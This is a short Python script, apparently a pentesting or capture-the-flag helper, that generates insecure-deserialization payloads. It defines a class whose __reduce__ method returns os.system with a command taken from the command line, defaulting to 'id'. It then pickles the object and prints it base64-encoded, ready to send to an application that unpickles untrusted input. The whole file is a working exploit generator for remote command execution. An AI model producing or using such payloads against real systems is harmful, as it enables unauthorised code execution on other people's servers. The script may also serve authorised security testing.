#!/bin/python3

import pickle,base64,os,sys

try:
	if(sys.argv[1] == "--help" or sys.argv[1] == "-h"):
		print("""\nUSAGE\n=====\n./pickle-payload-gen.py <payload>\n""")
		sys.exit()

	command = sys.argv[1]

except IndexError:
	print("\n[-] No payload specified sticking with default payload => id\n")
	command = "id"


class PAYLOAD():
	def __reduce__(self):
		return os.system, ("{}".format(command),)
		
b64Encoded = base64.b64encode(pickle.dumps(PAYLOAD(), protocol=0)).decode("utf-8")

print("Payload (Base64) => {}".format(b64Encoded))

